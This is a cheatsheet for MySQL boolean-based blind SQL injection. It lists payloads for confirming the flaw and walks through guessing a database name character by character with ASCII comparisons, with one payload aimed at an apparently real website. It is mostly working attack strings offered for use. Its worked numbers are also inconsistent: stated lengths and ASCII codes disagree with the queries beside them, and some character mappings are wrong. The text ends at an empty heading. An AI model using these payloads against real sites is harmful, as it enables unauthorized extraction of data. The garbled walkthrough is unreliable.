# MySQL Boolean Based Blind SQL Injection Cheatsheet

## Identifying the vulnerability

Normally in Blind SQLi, you can't really see the output of queries you enter. In this case, the only way to verify about the vulnerability, is by looking if the website loads successfuly or not/partially.

Use the following queries to identify the website behaviour:  

```http://domain.com/index.php?id=1' AND 4570=4570 AND 'ZeoB'='ZeoB```  
Page fully loads successfuly.  

```http://www.nttbworld.com/tour-details.php?id=65' AND 4570=4570 AND 'ZeoB'='ZeoBFalse```  
Page will partially load or it will not even load.  

## Retrieving database

**Retrieving the length of database name**

The given query will verify if database has 14 characters.  
```http://domain.com/index.php?id=1' AND (length(database())) = 15 --+```  
If website partially loads or doesn't load, it means that database is not 10 characters long.

The given query will verify if database has 9 characters.  
```http://domain.com/index.php?id=1' AND (length(database())) = 11 --+```  
Page loads successfully. Database name is 11 characters long.

**Retrieving the database name**

This method is slow, because we have to hit-or-miss for every character of the database. Let's take a look below. The below table, will help us convert ascii to string.  

![ascii_table](https://imgs.chip.de/ZBgGgeBx4QyqnxIERLeIjZ0BoXg=/1200x674/filters:format(jpeg):fill(fff,true)/www.chip.de%2Fii%2F8%2F1%2F7%2F6%2F6%2F1%2F0%2F4%2FUnbenannt-41a448c7fdc8d42f.jpg)

The given query will define is the first character of database name is 111 (o)  
```http://domain.com/index.php?id=1' AND (ascii(substr((select database()),1,1))) > 110 --+```  
Website doesn't load fully, so our condition is incorrect, let's try another ascii.  

The given query will define is the first character of database name is 110 (n)  
```http://domain.com/index.php?id=1' AND (ascii(substr((select database()),1,1))) > 109 --+```  
Website loads fully, this means the first character of database is **n**.

Continue enumerate the second character of database name.  

The given query will define is the first character of database name is 98 (h)  
```http://domain.com/index.php?id=1' AND (ascii(substr((select database()),2,1))) > 97 --+```  
Website doesn't load fully, so our condition is incorrect, let's try another ascii.  


The given query will define is the first character of database name is 115 (t)  
```http://domain.com/index.php?id=1' AND (ascii(substr((select database()),2,1))) > 114 --+```  
Website loads fully, this means the second character of database is **t**.

Continue doing the same process over and over until you find all 11 characters.  

1st character: 110 -> **n**  
2nd character: 115 -> **t**  
3rd character: 115 -> **t**  
4th character: 104 -> **h**  
5th character: 119 -> **w**  
6th character: 102 -> **f**  
7th character: 105 -> **i**  
8th character: 57 -> **9**  
9th character: 95 -> _  
10th character: 100 -> **d**  
11th character: 98 -> **b**  

All 11 charachters combined together will be the database name: **ntthwfi9_db**

**Retrieving length of table name**
